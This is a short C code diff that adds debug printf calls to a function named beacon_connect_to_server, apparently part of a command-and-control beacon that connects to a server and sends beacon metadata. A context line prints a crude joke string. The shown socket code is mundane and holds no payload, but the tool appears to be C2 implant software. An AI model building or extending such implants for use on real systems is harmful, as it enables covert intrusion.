@@ -25,6 +25,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
 
     // Connect to server.
     iResult = connect(s, (SOCKADDR *) & clientService, sizeof (clientService));
+    printf("%d", iResult);
 
 
     // Generate and send beacon metadata     
@@ -51,7 +52,9 @@ void beacon_connect_to_server(char IP[16], int PORT){
     
     // Close the socket
     iResult = shutdown(s, SD_SEND);
+    printf("%d", iResult);
     jResult = closesocket(s);
+    printf("%d", jResult);
 
     // Random print
     printf("bobs & vagene %s:%d\n", IP, PORT);
